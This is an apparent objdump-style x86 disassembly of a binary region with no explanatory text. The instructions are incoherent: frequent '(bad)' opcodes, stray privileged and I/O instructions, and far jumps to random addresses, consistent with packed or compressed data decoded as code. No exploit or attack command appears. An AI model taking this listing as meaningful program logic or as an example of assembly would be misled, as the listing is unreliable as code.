  419355:	aas    
  419356:	push   esi
  419357:	shr    bl,cl
  419359:	and    eax,0x5c6029e1
  41935e:	out    dx,eax
  41935f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419360:	(bad)  [eax-0x29]
  419363:	sbb    edi,DWORD PTR [ecx+esi*2-0x69]
  419367:	add    al,0xda
  419369:	mov    esp,0x73d9fa6d
  41936e:	hlt    
  41936f:	dec    edi
  419370:	mov    es,WORD PTR [esi-0x31]
  419373:	dec    edi
  419374:	mov    WORD PTR [edx-0x653edd0e],?
  41937a:	ja     0x419345
  41937c:	rcl    bh,0x11
  41937f:	jecxz  0x419372
  419381:	pop    ebx
  419382:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419383:	test   al,0x16
  419385:	pusha  
  419386:	cmp    al,0xdc
  419388:	inc    esp
  419389:	hlt    
  41938a:	dec    ecx
  41938b:	xchg   BYTE PTR [edx],al
  41938d:	mov    cl,0x73
  41938f:	(bad)  
  419390:	xchg   esi,eax
  419391:	dec    esp
  419392:	inc    esp
  419393:	cwde   
  419394:	xor    BYTE PTR [edx+0x6c],bl
  419397:	or     cl,BYTE PTR [ecx+0x7e665b9c]
  41939d:	cs stos DWORD PTR es:[edi],eax
  41939f:	dec    esp
  4193a0:	aam    0xdf
  4193a2:	push   esp
  4193a3:	mov    al,ds:0xfd7c7df2
  4193a8:	xlat   BYTE PTR ds:[ebx]
  4193a9:	mov    esp,0x3a6128dc
  4193ae:	leave  
  4193af:	(bad)  
  4193b0:	loope  0x4193ac
  4193b2:	je     0x4193f8
  4193b4:	inc    ebp
	...
  419415:	add    BYTE PTR ds:0xed3a6998,bh
  41941b:	sti    
  41941c:	jg     0x4193bd
  41941e:	les    ecx,FWORD PTR [ebp+ebp*8+0x59c09e37]
  419425:	mov    cl,0x7c
  419427:	or     DWORD PTR [ecx],eax
  419429:	add    BYTE PTR [edi],al
  41942b:	add    DWORD PTR [eax],eax
  41942d:	add    BYTE PTR [ebx],bl
  41942f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419430:	push   cs
  419431:	(bad)  
  419433:	sbb    eax,DWORD PTR [edx+edx*1]
  419436:	or     esi,DWORD PTR [ebp-0xf6af910]
  41943c:	inc    esp
  41943d:	aam    0x5a
  41943f:	fimul  DWORD PTR [esp+esi*1]
  419442:	mov    ecx,0xee2ee015
  419447:	cld    
  419448:	(bad)  
  419449:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41944a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41944b:	jne    0x419418
  41944d:	jle    0x419418
  41944f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419450:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  419452:	sub    ch,BYTE PTR [eax-0x76]
  419455:	jge    0x419479
  419457:	add    BYTE PTR [ecx],cl
  419459:	fiadd  DWORD PTR [edi-0x55c0bf3]
  41945f:	cmp    al,0xee
  419461:	bound  edi,QWORD PTR [edi-0x4e]
  419464:	xor    ch,cl
  419466:	jle    0x41948e
  419468:	jne    0x4194e3
  41946a:	data16 jp 0x41940b
  41946d:	sbb    ch,bh
  41946f:	xor    bh,0x51
  419472:	std    
  419473:	outs   dx,BYTE PTR ds:[esi]
  419474:	lods   al,BYTE PTR ds:[esi]
  419475:	push   ebp
  419476:	jbe    0x4194d7
  419478:	sbb    DWORD PTR ds:0x42e17ea4,edx
  41947e:	xor    eax,0xb662b3d2
  419483:	push   esi
  419484:	lea    esi,[edi+ebp*8-0x77]
  419488:	jg     0x4194dd
  41948a:	neg    DWORD PTR [esi]
  41948c:	rcr    eax,1
  41948e:	pop    ss
  41948f:	xchg   esi,eax
  419490:	mov    dh,0xea
  419492:	fmul   QWORD PTR [ecx+0x72]
  419495:	cmc    
  419496:	sbb    al,0x1
  419498:	leave  
  419499:	adc    edi,DWORD PTR [esi]
  41949b:	stos   DWORD PTR es:[edi],eax
  41949c:	and    al,0x2c
  41949e:	clc    
  41949f:	and    eax,0x416056e7
  4194a4:	adc    ah,al
  4194a6:	and    DWORD PTR [ebx-0x57],0xaa7dcb70
  4194ad:	(bad)  
  4194ae:	aad    0x71
  4194b0:	dec    ebx
  4194b1:	mov    bh,0xcf
  4194b3:	xor    BYTE PTR [edx-0x533c63f7],ah
  4194b9:	adc    al,0x82
  4194bb:	repz mov bl,0xf3
  4194be:	pop    esi
  4194bf:	(bad)  
  4194c0:	pop    es
  4194c1:	(bad)  
  4194c2:	sub    al,0xc4
  4194c4:	xor    al,0xe4
  4194c6:	dec    eax
  4194c7:	push   ebx
  4194c8:	pop    es
  4194c9:	sbb    eax,0x77aa85a1
  4194ce:	test   DWORD PTR [edi+esi*4-0x70],ebx
  4194d2:	gs or  eax,0x6d27774e
  4194d8:	sub    ch,BYTE PTR [ebx]
  4194da:	jne    0x41953f
  4194dc:	mov    ch,0x66
  4194de:	test   eax,0xfb2096f4
  4194e3:	out    0x28,eax
  4194e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4194e6:	es add al,0x90
  4194e9:	fs cmc 
  4194eb:	ret    0x86a6
  4194ee:	cmc    
  4194ef:	pop    esi
  4194f0:	jne    0x4194de
  4194f2:	jb     0x419548
  4194f4:	jmp    0x419484
  4194f6:	mov    dl,0x4e
  4194f8:	dec    edx
  4194f9:	stc    
  4194fa:	popw   ds
  4194fc:	ret    
  4194fd:	call   0x6ac47cc3
  419502:	ret    0x64cf
  419505:	scas   al,BYTE PTR es:[edi]
  419506:	or     esp,esp
  419508:	xor    edx,esi
  41950a:	or     BYTE PTR [esi],bl
  41950c:	aas    
  41950d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41950e:	jae    0x4194d1
  419510:	(bad)  
  419511:	cmp    al,BYTE PTR [edi-0x50]
  419514:	pop    edi
  419515:	mov    ah,0x2f
  419517:	repnz mov edx,0x5d71d9e9
  41951d:	(bad)  
  41951e:	in     al,dx
  41951f:	ss mov edx,0xd0503efd
  419525:	inc    esp
  419526:	or     ebp,DWORD PTR fs:[edx]
  419529:	loop   0x41958c
  41952b:	or     eax,ebx
  41952d:	adc    BYTE PTR [ebx+0x5506f4b1],dl
  419533:	mov    eax,ds:0x8d
	...
  419594:	add    BYTE PTR [eax],al
  419596:	scas   eax,DWORD PTR es:[edi]
  419597:	aam    0x8d
  419599:	(bad)  
  41959a:	(bad)  
  41959b:	jnp    0x41958c
  41959d:	fnsave [ebx-0xf]
  4195a0:	xchg   esi,eax
  4195a1:	test   BYTE PTR [edx],0xe0
  4195a4:	cmp    cl,BYTE PTR [ecx+0x10a83]
  4195aa:	pop    es
  4195ab:	add    DWORD PTR [eax],eax
  4195ad:	add    BYTE PTR [ebp+ecx*1+0x76809503],ah
  4195b4:	add    dh,BYTE PTR [edx]
  4195b6:	int3   
  4195b7:	xor    ecx,DWORD PTR [edx]
  4195b9:	ret    
  4195ba:	pop    edi
  4195bb:	enter  0x5a2a,0x19
  4195bf:	pop    esi
  4195c0:	repz jb 0x41961e
  4195c3:	iret   
  4195c4:	or     BYTE PTR [eax-0x56540c19],bl
  4195ca:	mov    esp,0x62a33de7
  4195cf:	in     al,dx
  4195d0:	pop    eax
  4195d1:	lds    esi,FWORD PTR [edx+0x56a48c40]
  4195d7:	(bad)  
  4195d8:	daa    
  4195d9:	stos   DWORD PTR es:[edi],eax
  4195da:	pop    esi
  4195db:	inc    ebp
  4195dc:	lods   al,BYTE PTR ds:[esi]
  4195dd:	fsub   DWORD PTR ss:[edx-0x10]
  4195e1:	add    edx,ebx
  4195e3:	(bad)  
  4195e4:	mov    WORD PTR [ebx+eax*2],ds
  4195e7:	lods   al,BYTE PTR ds:[esi]
  4195e8:	pop    esi
  4195e9:	push   es
  4195ea:	inc    edi
  4195eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4195ec:	repz jle 0x4195e3
  4195ef:	jmp    0xebce915f
  4195f4:	sub    dh,BYTE PTR [edx]
  4195f6:	xor    dh,al
  4195f8:	push   ds
  4195f9:	jle    0x4195d7
  4195fb:	xchg   esp,eax
  4195fc:	clc    
  4195fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4195fe:	(bad)  
  4195ff:	and    al,BYTE PTR [ecx-0x50]
  419602:	jne    0x419657
  419604:	cmp    esp,DWORD PTR [ecx+0x73248cbf]
  41960a:	pop    es
  41960b:	ja     0x419608
  41960d:	sub    BYTE PTR [edx],ah
  41960f:	cli    
  419610:	sub    DWORD PTR [esi-0x75],ebx
  419613:	push   esi
  419614:	cld    
  419615:	test   BYTE PTR [ecx+0x7836b3de],bh
  41961b:	hlt    
  41961c:	xlat   BYTE PTR ds:[ebx]
  41961d:	xor    al,ch
  41961f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419620:	fidiv  WORD PTR [eax+0x34]
  419623:	lock jecxz 0x419628
  419626:	pop    esp
  419627:	cld    
  419628:	inc    ebx
  419629:	mov    WORD PTR [ecx+0x64a8e8c5],ss
  41962f:	sahf   
  419630:	or     cl,BYTE PTR [eax-0x7de62ad6]
  419636:	fiadd  WORD PTR [eax-0x20]
  419639:	jmp    0x419645
  41963b:	jg     0x419656
  41963d:	jg     0x4196b0
  41963f:	cld    
  419640:	pop    ss
  419641:	popa   
  419642:	pop    ebx
  419643:	sub    BYTE PTR [eax],bh
  419645:	dec    esp
  419646:	adc    DWORD PTR [ebx],ebp
  419648:	xchg   ebx,eax
  419649:	lea    edi,[edi+0x5e]
  41964c:	iret   
  41964d:	mov    cs:0x31257b4f,eax
  419653:	lock lods eax,DWORD PTR ds:[esi]
  419655:	mov    esi,0x4025399c
  41965a:	(bad)  
  41965b:	pop    ebx
  41965c:	pop    ds
  41965d:	dec    esi
  41965e:	es loopne 0x41963c
  419661:	push   esi
  419662:	mov    esi,0x8ce0be07
  419667:	in     al,dx
  419668:	loope  0x4196af
  41966a:	add    ch,BYTE PTR [eax]
  41966c:	xor    BYTE PTR [edx+0x385445b2],dl
  419672:	xor    BYTE PTR [esi-0x2c],bh
  419675:	clc    
  419676:	retf   
  419677:	aaa    
  419678:	jl     0x419691
  41967a:	retf   0x327c
  41967d:	mov    ebp,0x95ee7823
  419682:	call   0x27e0:0x3d53bdbe
  419689:	std    
  41968a:	add    BYTE PTR [eax+0x4c8a3237],bh
  419690:	loope  0x4196db
  419692:	fisub  DWORD PTR [ebp+0x39]
  419695:	bound  ebx,QWORD PTR [ecx]
  419697:	mov    dl,0x4b
  419699:	call   0xa8b3fda9
  41969e:	sub    eax,0x1bd11424
  4196a3:	clc    
  4196a4:	aas    
  4196a5:	lock shr BYTE PTR [ebx+0x67],cl
  4196a9:	call   0x374a3595
  4196ae:	jns    0x41970a
  4196b0:	test   al,0x75
  4196b2:	xchg   ebp,eax
  4196b3:	shr    BYTE PTR [ebx],0x0
	...
  419716:	mov    bl,0x3f
  419718:	jno    0x41977f
  41971a:	std    
  41971b:	outs   dx,DWORD PTR ds:[esi]
  41971c:	mov    bh,0xff
  41971e:	inc    ebp
  41971f:	loop   0x419766
  419721:	dec    esp
  419722:	jns    0x419700
  419724:	fwait
  419725:	dec    ebx
  419726:	mov    cl,BYTE PTR [ebx]
  419728:	add    DWORD PTR [eax],eax
  41972a:	pop    es
  41972b:	add    DWORD PTR [eax],eax
  41972d:	add    BYTE PTR [eax+0x3e],al
  419730:	scas   eax,DWORD PTR es:[edi]
  419731:	adc    ch,BYTE PTR [ecx]
  419733:	cmp    bh,BYTE PTR [ecx-0xc37e2a7]
  419739:	sahf   
  41973a:	sub    al,0x1d
  41973c:	iret   
  41973d:	xor    al,0x18
  419740:	xchg   ebp,eax
  419741:	dec    esp
  419742:	push   0xffd1c9d4
  419747:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419748:	or     DWORD PTR [edi+eax*2-0x5b],esp
  41974c:	sub    DWORD PTR [edi],esp
  41974e:	mov    DWORD PTR [ecx-0x31],eax
  419751:	fisubr DWORD PTR [eax+0x5]
  419754:	or     edi,DWORD PTR [eax-0x50]
  419757:	pop    ebx
  419758:	call   DWORD PTR [edx-0x2c]
  41975b:	imul   esi,DWORD PTR [edx],0xffffff84
  41975e:	sahf   
  41975f:	ins    DWORD PTR es:[di],dx
  419761:	xchg   ebp,eax
  419762:	test   BYTE PTR [ebx],ch
  419764:	dec    ebp
  419765:	xchg   esi,eax
  419766:	mov    ecx,0xe589b430
  41976b:	pop    edi
  41976c:	mov    ah,0x80
  41976e:	mov    al,0x57
  419770:	push   edi
  419771:	push   ebx
  419772:	cdq    
  419773:	daa    
  419774:	mov    ebx,0xc93a1f24
  419779:	dec    eax
  41977a:	adc    esi,ebp
  41977c:	aam    0xb9
  41977e:	(bad)  
  41977f:	ja     0x41972e
  419781:	aas    
  419782:	fxch   st(2)
  419784:	je     0x419745
  419786:	jmp    0xda4e:0x19d85870
  41978d:	jne    0x419787
  41978f:	pusha  
  419790:	fcmovu st,st(4)
  419792:	mov    al,ds:0x33e2d0f6
  419797:	inc    edi
  419798:	jmp    0x1dc027cc
  41979d:	jmp    0x41974e
  41979f:	jo     0x419767
  4197a1:	jo     0x419757
  4197a3:	dec    eax
  4197a4:	test   al,0x85
  4197a6:	sbb    esp,DWORD PTR [ebx-0x39]
  4197a9:	jecxz  0x4197c7
  4197ab:	inc    ebx
  4197ac:	lahf   
  4197ad:	and    al,0x8c
  4197af:	add    ecx,esp
  4197b1:	push   eax
  4197b2:	sbb    edx,ebx
  4197b4:	iret   
  4197b5:	inc    edx
  4197b6:	imul   esp,DWORD PTR [ecx],0xffffff9f
  4197b9:	out    dx,eax
  4197ba:	fstp   QWORD PTR [edx]
  4197bc:	out    dx,eax
  4197bd:	scas   eax,DWORD PTR es:[edi]
  4197be:	popf   
  4197bf:	mov    esi,0xbd827b8e
  4197c4:	sub    al,0xad
  4197c6:	fmulp  st(5),st
  4197c8:	jg     0x419849
  4197ca:	cmp    eax,0xeb334c6b
  4197cf:	js     0x419798
  4197d1:	icebp  
  4197d2:	mov    ch,BYTE PTR [ecx+ecx*1+0x73]
  4197d6:	test   eax,0x1c6ccbf0
  4197db:	push   ecx
  4197dc:	inc    ecx
  4197dd:	hlt    
  4197de:	mov    WORD PTR [edi-0x7d],gs
  4197e1:	int3   
  4197e2:	jl     0x4197b8
  4197e4:	push   edi
  4197e5:	fmul   QWORD PTR [esi]
  4197e7:	mov    ds:0x426cfab3,eax
  4197ec:	mov    edx,0xe0e93b89
  4197f1:	add    edx,DWORD PTR [ecx+0x3f]
  4197f4:	stc    
  4197f5:	jmp    0xe74f4f13
  4197fa:	push   esp
  4197fb:	shr    DWORD PTR [ecx],1
  4197fd:	sub    BYTE PTR [ebx-0x46],al
  419800:	sbb    DWORD PTR ds:0xf424d322,ecx
  419806:	retf   
  419807:	or     ch,BYTE PTR [eax]
  419809:	arpl   WORD PTR [edx+0x2f],bp
  41980c:	js     0x419816
  41980e:	jne    0x41980f
  419810:	sub    BYTE PTR [ebx+0x3c],cl
  419813:	dec    ebx
  419814:	mov    ebp,0x5a06d315
  419819:	das    
  41981a:	(bad)  
  41981b:	std    
  41981c:	aaa    
  41981d:	mov    gs,WORD PTR ds:0x96973ca9
  419823:	jmp    0x4197c5
  419825:	aad    0x5c
  419827:	xchg   esp,eax
  419828:	mov    ebx,esp
  41982a:	enter  0xd299,0x9e
  41982e:	mov    eax,0x5beda340
  419833:	inc    edx
  419834:	aam    0x0
	...
  419896:	sbb    BYTE PTR [ecx],0x47
  419899:	loope  0x41987a
  41989b:	jmp    DWORD PTR [esi-0x4a285f85]
  4198a1:	fisubr DWORD PTR [ebx-0x7f]
  4198a4:	add    eax,0x10c91ab
  4198a9:	add    BYTE PTR [edi],al
  4198ab:	add    DWORD PTR [eax],eax
  4198ad:	add    BYTE PTR [ebx-0x51],bh
  4198b0:	adc    BYTE PTR [edx+0x5d395805],0x0
  4198b7:	or     dh,BYTE PTR [edx]
  4198b9:	stos   DWORD PTR es:[edi],eax
  4198ba:	into   
  4198bb:	mov    esi,0xfed9f488
  4198c0:	mov    ah,0xfc
  4198c2:	sbb    BYTE PTR [ebp-0x65107bac],bl
  4198c8:	mov    eax,ds:0x8855614d
  4198cd:	mov    cl,0x3f
  4198cf:	ins    BYTE PTR es:[edi],dx
  4198d0:	mul    DWORD PTR [edx]
  4198d2:	dec    esi
  4198d3:	into   
  4198d4:	dec    edx
  4198d5:	mov    dh,BYTE PTR [ecx]
  4198d7:	das    
  4198d8:	ss sahf 
  4198da:	js     0x4198c2
  4198dc:	dec    ebx
  4198dd:	fsubr  QWORD PTR [eax]
  4198df:	test   al,al
  4198e1:	xchg   edx,eax
  4198e2:	out    0x7e,eax
  4198e4:	neg    edx
  4198e6:	pop    ecx
  4198e7:	pop    esi
  4198e8:	loop   0x4198a9
  4198ea:	jae    0x4198cd
  4198ec:	retf   0x5d97
  4198ef:	mov    esp,DWORD PTR [edx+0x71]
  4198f2:	or     BYTE PTR [ebp+0x6a83aa94],ah
  4198f8:	fwait
  4198f9:	xor    al,0x92
  4198fb:	clc    
  4198fc:	daa    
  4198fd:	outs   dx,BYTE PTR ds:[esi]
  4198fe:	adc    esi,ecx
  419900:	pop    ecx
  419901:	jmp    0xeb9b:0x11bbadd4
  419908:	xchg   BYTE PTR [eax],cl
  41990a:	in     eax,dx
  41990b:	loop   0x419978
  41990d:	in     eax,0x7d
  41990f:	mov    eax,0x5ce44982
  419914:	(bad)  
  419915:	mov    eax,DWORD PTR [edi+0x1a]
  419918:	outs   dx,BYTE PTR ds:[esi]
  419919:	out    dx,al
  41991a:	mov    ebp,ecx
  41991c:	hlt    
  41991d:	mov    al,0x32
  41991f:	adc    al,BYTE PTR [ebp+0x2a3b67dc]
  419925:	pusha  
  419926:	retf   0x72ef
  419929:	std    
  41992a:	ss int 0x8
  41992d:	add    eax,0xf9ab2f6
  419932:	aas    
  419933:	mov    gs,WORD PTR [eax-0x3a]
  419936:	sbb    al,0xb
  419938:	sbb    eax,0xc894f6ad
  41993d:	mov    ch,0x2
  41993f:	mov    cl,BYTE PTR [ecx+0x181bc80]
  419945:	mov    ch,0x99
  419947:	cmc    
  419948:	dec    cl
  41994a:	aaa    
  41994b:	loopne 0x419920
  41994d:	sbb    BYTE PTR [ebx+0x5fabe0eb],cl
  419953:	add    ah,al
  419955:	nop
  419956:	stos   DWORD PTR es:[edi],eax
  419957:	pusha  
  419958:	sar    DWORD PTR [ebp+0x73],0xe9
  41995c:	ins    BYTE PTR es:[edi],dx
  41995d:	dec    esi
  41995e:	inc    DWORD PTR [esi+eiz*8+0x48862dbf]
  419965:	inc    edi
  419966:	pop    esi
  419967:	mov    ?,WORD PTR [ecx-0x1b]
  41996a:	push   esi
  41996b:	mul    BYTE PTR [edx+0xe68c1fb]
  419971:	bnd jp 0x41990d
  419974:	fnstsw WORD PTR [ebp-0x32]
  419977:	aad    0xde
  419979:	push   0xe801bff1
  41997e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41997f:	mov    edi,0x8a23a131
  419984:	inc    ebx
  419985:	cld    
  419986:	rol    BYTE PTR [esi-0x5d4c8bad],cl
  41998c:	sub    al,0xc5
  41998e:	ins    DWORD PTR es:[edi],dx
  41998f:	or     al,0x6f
  419991:	jp     0x419a12
  419993:	rcr    BYTE PTR [esi],cl
  419995:	cmp    eax,0x8f1c9fe9
  41999a:	adc    bl,ah
  41999c:	ret    0xce7a
  41999f:	test   al,0x15
  4199a1:	mov    cl,0x5e
  4199a3:	in     al,dx
  4199a4:	sub    BYTE PTR gs:[edi+0x78ef98f2],cl
  4199ab:	cmp    DWORD PTR [ecx+0x1c],0x7b
  4199af:	cld    
  4199b0:	and    al,0xc0
  4199b2:	jecxz  0x419995
  4199b4:	lods   al,BYTE PTR ds:[esi]
	...
  419a15:	add    BYTE PTR [ebx],dh
  419a17:	xor    DWORD PTR [ebx+0x77e793c5],edx
  419a1d:	neg    DWORD PTR [ecx+0x16]
  419a20:	mov    eax,ds:0x8cec6c09
  419a25:	add    DWORD PTR [eax+0x700010d],ebx
  419a2b:	add    DWORD PTR [eax],eax
  419a2d:	add    BYTE PTR ds:0x1d2bb27d,ah
  419a33:	test   eax,0x3963ee68
  419a38:	int    0xde
  419a3a:	out    0xd1,eax
  419a3c:	loope  0x419a87
  419a3e:	xchg   ebp,eax
  419a3f:	imul   ebp,DWORD PTR [esi],0xa2f4b66e
  419a45:	inc    eax
  419a46:	out    0xfa,al
  419a48:	inc    esi
  419a49:	test   eax,0xf1df5662
  419a4e:	pop    edx
  419a4f:	push   ebp
  419a50:	jl     0x419a10
  419a52:	sbb    eax,0x96d3155a
  419a57:	add    BYTE PTR [esi-0x1a],cl
  419a5a:	pop    edx
  419a5b:	mov    ebp,0x485de02f
  419a60:	add    esi,ecx
  419a62:	(bad)  ds:0x5ce0f38
  419a68:	adc    eax,0x95f22e1c
  419a6d:	mov    ecx,0x5b141ffb
  419a72:	addr16 gs mov edi,ecx
  419a76:	xchg   dl,al
  419a78:	jb     0x419a04
  419a7a:	sbb    al,0x33
  419a7c:	inc    edx
  419a7d:	xor    ebp,ebp
  419a7f:	loop   0x419a75
  419a81:	and    BYTE PTR [edx],ch
  419a83:	sub    dl,BYTE PTR [eax+0x1d007993]
  419a89:	mov    bl,0x90
  419a8b:	pushf  
  419a8c:	aad    0xa7
  419a8e:	adc    BYTE PTR [ebx-0x5e],bl
  419a91:	aam    0x78
  419a93:	xor    ecx,edi
  419a95:	mov    ch,0x65
  419a97:	push   es
  419a98:	dec    edi
  419a99:	mov    edx,0x5513750c
  419a9e:	jmp    0xf060:0xb7ef9b4
  419aa5:	loop   0x419b01
  419aa7:	xchg   esi,eax
  419aa8:	pop    es
  419aa9:	adc    eax,0x6bf00213
  419aae:	movaps XMMWORD PTR [ecx+0xb],xmm0
  419ab2:	push   0x1d
  419ab4:	xor    esi,DWORD PTR [esi-0x63]
  419ab7:	sar    DWORD PTR [esi+0x14],1
  419aba:	cmp    bl,al
  419abc:	das    
  419abd:	push   cs
  419abe:	aaa    
  419abf:	add    BYTE PTR [esi+0x20],cl
  419ac2:	cld    
  419ac3:	mov    bl,0x20
  419ac5:	pop    esi
  419ac6:	pop    esi
  419ac7:	loop   0x419aad
  419ac9:	out    dx,al
  419aca:	sar    BYTE PTR [eax],0x11
  419acd:	jnp    0x419ae9
  419acf:	int3   
  419ad0:	mov    ds:0x38a4ec4e,al
  419ad5:	xchg   esi,eax
  419ad6:	into   
  419ad7:	jne    0x419a89
  419ad9:	push   ss
  419ada:	cwde   
  419adb:	inc    ebx
  419adc:	mov    ebx,0xf74a7782
  419ae1:	pop    eax
  419ae2:	push   esp
  419ae3:	pop    ecx
  419ae4:	stc    
  419ae5:	(bad)  
  419ae6:	xor    edx,DWORD PTR [ebx]
  419ae8:	sbb    BYTE PTR gs:[ebp+0x52f487f1],bl
  419aef:	pop    eax
  419af0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419af1:	jge    0x419b2f
  419af3:	adc    al,0x5a
  419af5:	sbb    ebx,DWORD PTR [edx-0x47]
  419af8:	ss sar ebp,0x63
  419afc:	xor    ch,BYTE PTR [eax+eax*4-0xaaa9d0b]
  419b03:	add    dh,dh
  419b05:	aaa    
  419b06:	mov    dh,0xaf
  419b08:	and    DWORD PTR [eax],0x5c
  419b0b:	pusha  
  419b0c:	jnp    0x419ac7
  419b0e:	fst    DWORD PTR [esi-0x26ec2bb6]
  419b14:	outs   dx,DWORD PTR ds:[esi]
  419b15:	test   al,0x62
  419b17:	enter  0xc1f6,0x3d
  419b1b:	es add esi,0xffffffcd
  419b1f:	and    BYTE PTR [edx+0x0],ah
  419b22:	push   edx
  419b23:	call   0x254d72f5
  419b28:	or     dl,BYTE PTR [ebp+0x4c4a6ffb]
  419b2e:	aad    0x5c
  419b30:	fcomp  st(1)
  419b32:	inc    edx
  419b33:	mov    edi,0x68
	...
  419b94:	add    BYTE PTR [eax],al
  419b96:	dec    edx
  419b97:	(bad)  
  419b98:	cli    
  419b99:	inc    edi
  419b9a:	(bad)  
  419b9b:	jg     0x419b9c
  419b9d:	int    0xb7
  419b9f:	cs aam 0x47
  419ba2:	or     ebp,DWORD PTR [ebx]
  419ba4:	mov    ebp,0x10e9faa
  419ba9:	add    BYTE PTR [edi],al
  419bab:	add    DWORD PTR [eax],eax
  419bad:	add    cl,ch
  419baf:	add    DWORD PTR [edx-0x15],ebp
  419bb2:	dec    ecx
  419bb3:	ds aad 0x7
  419bb6:	xlat   BYTE PTR ds:[ebx]
  419bb7:	cmc    
  419bb8:	mov    esi,0xcaa6e7b5
  419bbd:	xchg   ecx,eax
  419bbe:	adc    esp,esi
  419bc0:	push   ds
  419bc1:	push   edi
  419bc2:	daa    
  419bc3:	adc    DWORD PTR [edi-0x7],edx
  419bc6:	ins    BYTE PTR es:[edi],dx
  419bc7:	idiv   BYTE PTR ds:0xc366ae11
  419bcd:	ret    0xbb3b
  419bd0:	popa   
  419bd1:	jne    0x419b85
  419bd3:	outs   dx,BYTE PTR ds:[esi]
  419bd4:	jo     0x419bb3
  419bd6:	and    DWORD PTR [esi+0x65db7a1],edx
  419bdc:	lahf   
  419bdd:	ret    
  419bde:	int3   
  419bdf:	sbb    BYTE PTR [edx],bh
  419be1:	js     0x419c33
  419be3:	add    dl,BYTE PTR [ebp+ebp*8-0x4a]
  419be7:	or     eax,DWORD PTR [ebx+0x38043a52]
  419bed:	push   esp
  419bee:	adc    ecx,DWORD PTR [ecx+0x1f]
  419bf1:	xchg   ebx,eax
  419bf2:	mov    al,ds:0xc61207ac
  419bf7:	stc    
  419bf8:	jno    0x419c2c
  419bfa:	dec    edi
  419bfb:	xchg   ebx,eax
  419bfc:	jmp    0x419bfc
  419bfe:	mov    ebx,0x3fd48672
  419c03:	mov    WORD PTR [edi+edx*4],gs
  419c06:	push   cs
  419c07:	and    esp,edi
  419c09:	arpl   WORD PTR [eax+0x61],sp
  419c0c:	cli    
  419c0d:	outs   dx,DWORD PTR ds:[esi]
  419c0e:	add    DWORD PTR [ecx],edx
  419c10:	adc    ebx,DWORD PTR [edx+esi*2+0x1]
  419c14:	sub    al,0x4
  419c16:	(bad)  
  419c18:	nop
  419c19:	jnp    0x419c07
  419c1b:	nop
  419c1c:	dec    ecx
  419c1d:	inc    ecx
  419c1e:	les    eax,FWORD PTR [ebx-0x475e1f35]
  419c24:	in     eax,dx
  419c25:	jne    0x419c88
  419c27:	out    dx,al
  419c28:	pop    ebx
  419c29:	or     eax,0xe4f4b60c
  419c2e:	sub    eax,0xa01a89
  419c33:	dec    edi
  419c34:	inc    ebp
  419c35:	xchg   ebx,eax
  419c36:	xchg   edx,eax
  419c37:	and    eax,edi
  419c39:	and    dl,BYTE PTR [edx-0x4d]
  419c3c:	stc    
  419c3d:	pop    ds
  419c3e:	jge    0x419be6
  419c40:	aaa    
  419c41:	add    ah,BYTE PTR [bx+si+0x342e]
  419c46:	sub    eax,0xe496b45b
  419c4b:	xchg   edi,eax
  419c4c:	mov    esp,0xb5b48709
  419c51:	pop    ss
  419c52:	jle    0x419be2
  419c54:	mov    bl,0xde
  419c56:	and    dh,BYTE PTR [ebp-0x62a04aeb]
  419c5c:	inc    ebx
  419c5d:	bound  ecx,QWORD PTR [edi]
  419c5f:	scas   al,BYTE PTR es:[edi]
  419c60:	out    dx,eax
  419c61:	mov    ecx,0x1bc2b75c
  419c66:	mov    ds:0xf075b254,al
  419c6b:	ret    0x8ac
  419c6e:	push   edx
  419c6f:	loopne 0x419c0e
  419c71:	xchg   edi,eax
  419c72:	test   DWORD PTR [eax+0xe],esi
  419c75:	sar    BYTE PTR [edx+0x73],cl
  419c78:	retf   0x6673
  419c7b:	and    eax,0x7cb53777
  419c80:	lods   al,BYTE PTR ds:[esi]
  419c81:	nop    DWORD PTR [edx+0x2892c63d]
  419c88:	and    al,0x53
  419c8a:	add    edx,edi
  419c8c:	rol    DWORD PTR [edi+edi*2-0x71b4c6ad],0xac
  419c94:	(bad)  [ebx]
  419c96:	push   ebp
  419c97:	daa    
  419c98:	and    DWORD PTR [edi-0x31],ebp
  419c9b:	loopne 0x419c29
  419c9d:	stos   DWORD PTR es:[edi],eax
  419c9e:	std    
  419c9f:	mov    ds:0xda46af43,al
  419ca4:	ja     0x419cd1
  419ca6:	pop    esp
  419ca7:	in     eax,dx
  419ca8:	arpl   cx,si
  419caa:	push   eax
  419cab:	xor    bl,dh
  419cad:	dec    edi
  419cae:	aas    
  419caf:	scas   al,BYTE PTR es:[edi]
  419cb0:	sub    eax,0xd7baa54e
	...
  419d15:	add    al,dh
  419d17:	xchg   edi,eax
  419d18:	std    
  419d19:	cmp    al,0xff
  419d1b:	jle    0x419d0e
  419d1d:	fistp  WORD PTR [eax]
  419d1f:	push   0xb5bc9c45
  419d24:	inc    eax
  419d25:	mov    ebx,0x10fa6
  419d2a:	pop    es
  419d2b:	add    DWORD PTR [eax],eax
  419d2d:	add    BYTE PTR [esi+0x131a4c35],bh
  419d33:	clc    
  419d34:	pop    ebx
  419d35:	mov    ebp,0xb9a5df4b
  419d3a:	int3   
  419d3b:	shl    BYTE PTR [esp+edx*4+0x3c],1
  419d3f:	or     BYTE PTR [edi-0x28d0930a],0xc1
  419d46:	inc    esi
  419d47:	fsubr  DWORD PTR [esi]
  419d49:	pop    edi
  419d4a:	ret    
  419d4b:	aam    0x44
  419d4d:	addr16 ja 0x419d55
  419d50:	stc    
  419d51:	aaa    
  419d52:	xchg   ecx,eax
  419d53:	mov    esp,0x40a39639
  419d58:	add    bl,al
  419d5a:	inc    edi
  419d5b:	jmp    0xcaa9:0x80fc4583
  419d62:	retf   0x1d0d
